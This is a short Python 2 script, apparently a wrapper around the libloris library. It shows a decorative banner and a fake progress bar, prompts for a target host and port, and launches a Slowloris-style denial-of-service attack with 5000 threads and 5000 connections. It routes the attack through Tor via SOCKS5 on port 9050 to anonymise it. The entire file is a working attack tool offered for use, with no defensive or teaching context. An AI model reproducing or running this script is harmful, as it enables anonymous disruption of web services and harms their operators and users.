#! /usr/bin/env python
from libloris import *
import time, os


print\
"""
88      dP"Yb  88""Yb 88 .dP"Y8 
88     dP   Yb 88__dP 88 `Ybo." 
88  .o Yb   dP 88"Yb  88 o.`Y8b 
88ood8  YbodP  88  Yb 88 8bodP' 
"""
time.sleep(1)
print 'Runs through tor on 9050'
os.system("color 0a")

print "STARTING     .....        "

print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(0.5)
print "[=======             ] 40%"
time.sleep(0.1)
print "[============        ] 60%"
time.sleep(0.4)
print "[=================   ] 85%"
time.sleep(0.35)
print "[====================] 100%"
time.sleep(0.2) 
host = raw_input('HOST: ')
port = input('PORT: ')
sockshost = '127.0.0.1'
socksport = 9050

def main(host, port, sockshost, socksport):
    loris = ScriptLoris()

    loris.options['host'] = host
    loris.options['port'] = port
    loris.options['request'] = 'GET / HTTP/1.1\r\n'
    loris.options['request'] += 'Host: %s\r\n' % (host)
    loris.options['request'] += 'User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\r\n'

    loris.options['threadlimit'] = 5000
    loris.options['connectionlimit'] = 5000
    loris.options['connectionspeed'] = 1

    # Enable SOCKS5 on local port 9050
    loris.options['socksversion'] = 'SOCKS5'
    loris.options['sockshost'] = sockshost
    loris.options['socksport'] = socksport

    loris.mainloop()

if __name__ == "__main__":
    main(host, port, sockshost, socksport)
	
